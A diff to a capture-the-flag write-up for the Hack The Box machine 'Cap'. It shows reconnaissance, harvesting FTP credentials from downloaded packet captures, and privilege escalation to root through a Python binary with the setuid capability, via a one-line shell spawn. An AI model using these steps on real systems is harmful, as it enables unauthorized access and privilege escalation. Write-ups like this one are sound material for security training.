@@ -2,8 +2,9 @@
 IP address : 10.10.10.245\
 Operating System : Linux
 
-## Enumeration
-Lets start with running a network scan on the IP address using ```NMAP``` to identify the open ports and the services running on the open ports (NOTE: This might take up quite some time)
+## Discovery
+### Nmap
+Lets start with running a network scan on the IP address using Nmap to identify the open ports and the services running on the open ports (NOTE: This might take up quite some time)
 * sV : service detection
 * sC : Run default nmap scripts
 * A : identify the OS behind each ports
@@ -18,16 +19,20 @@ From the output of ```NMAP```, we are able to obtain the following information a
 | 22	| SSH | OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0) |
 | 21	| HTTP | Gunicorn |
 
-## Discovery
+### Web Discovery
 Visiting the webpage at ```10.10.10.245```, the site appears to be a security dashboard
 ![Screenshot of 10.10.10.245](https://github.com/joelczk/writeups/blob/main/HTB/Images/cap_securitydashboard.PNG)
 The ```IP config``` and ```Network Status``` does not contain any fascinating information, but the ```security snapshot``` contains a PCAP file that can be downloaded. 
 ![Screenshot of security snapshot](https://github.com/joelczk/writeups/blob/main/HTB/Images/cap_securitysnapshot.PNG)
 We will then proceed to save the PCAP file downloaded from ```http://10.10.10.245/data/0``` , ```http://10.10.10.245/data/1```, ```http://10.10.10.245/data/2``` and ```http://10.10.10.245/data/3```\
+
+
+## Exploit
+### Obtaining FTP credentials
 Viewing the PCAP file from ```http://10.10.10.245/data/0```, we are able to discover that there is a connection to the FTP server, and we are also able to retrieve the username and password to the FTP server
 ![Screenshot of FTP server](https://github.com/joelczk/writeups/blob/main/HTB/Images/cap_FTP.PNG)
 
-## Exploitation
+### Obtaining user flag
 Now, we will login to the FTP server using the discovered username and password. Afterwards, we will download the ```user.txt``` file to our server.
 ```code                                                                           
 ┌──(kali㉿kali)-[~]
@@ -61,6 +66,7 @@ local: user.txt remote: user.txt
 33 bytes received in 0.00 secs (298.3941 kB/s)
 ftp>
 ```
+### Login to SSH Server
 We will find the key from the ```user.txt``` file using the ```cat``` command, to obtain our user key.\
 Remembering that we have an SSH serve, we will now try to login to the SSH server. In the SSH server, we notice that the user ```nathan``` is unable to run sudo commands. Hence,we will start by searching for sudo permissions or SUID binaries that could escalate privileges and help us obtain the root shell.
 ```code
@@ -78,9 +84,16 @@ nathan@cap:~$ getcap -r / 2>/dev/null
 /usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
 nathan@cap:~$ 
 ```
+### Exploiting setuid capabilities
 We notice that ```python 3.8``` has a ```setuid``` command that can help us escalate to UID 0(root) and obtain a root shell. From there, we will be able to obtain our system flag.
 ```code
 nathan@cap:~$ python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'
 root@cap:~# cd /root
+```
+
+### Obtaining root flag
+Now, all we have to do is to obtain the root flag
+
+```
 root@cap:/root# cat root.txt
 ```
